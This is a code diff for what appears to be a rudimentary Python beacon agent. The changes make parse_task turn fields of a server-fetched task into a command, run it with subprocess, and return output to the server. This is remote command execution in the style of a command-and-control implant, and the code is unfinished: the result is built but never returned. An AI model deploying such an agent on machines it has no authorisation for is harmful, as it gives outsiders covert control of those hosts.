@@ -1,5 +1,6 @@
 import time
 import requests
+import subprocess
 
 
 def fetch_next_task():
@@ -9,13 +10,27 @@ def fetch_next_task():
 # Might rename this execute
 def parse_task(task):
     print("PARSE")
-    # First : _id
-    # Second: task_id
-    # Third: task_type
-    # Fourth + = extra
+    success = True
+    command = []
+    # Assume we have 4 task_types
+    task_type = task["task_type"]
+    if task_type == "ping":
+        command.append(task_type)
+    # Filter out command args
     for key in task:
-        if key not in ["_id", "task_id", "task_type"]:
+        if key not in ["_id", "task_id", "task_type", "task_status"]:
             print(f"{key}: {task[key]}")
+            command.append(task[key])
+    print(f"command : {command}")
+    # Perform task
+    print("Performing Task...")
+    process = subprocess.run(command, capture_output=True, timeout=30)
+    if process.returncode != 0:
+        # Set success
+        print("error")
+        success = False
+    print(process.stdout)
+    task_result = {"output": process.stdout, "success": success}
 
 
 def beacon_loop():
@@ -51,6 +66,7 @@ def beacon_loop():
                 'task_id': json['task_id'], 'contents': contents, 'success': success
             }
         ])
+        print(f"POST Result {result}")
         time.sleep(10)
 
 
